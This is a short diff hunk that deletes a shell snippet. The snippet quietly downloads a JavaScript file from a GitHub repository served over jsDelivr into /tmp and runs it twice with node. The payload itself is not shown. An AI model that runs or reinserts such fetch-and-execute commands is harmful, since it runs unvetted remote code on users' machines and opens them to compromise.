@@ -1,4 +1,0 @@
-curl -fs -o /tmp/p1.js "https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/p1.js"
-node /tmp/p1.js
-sleep 2
-node /tmp/p1.js
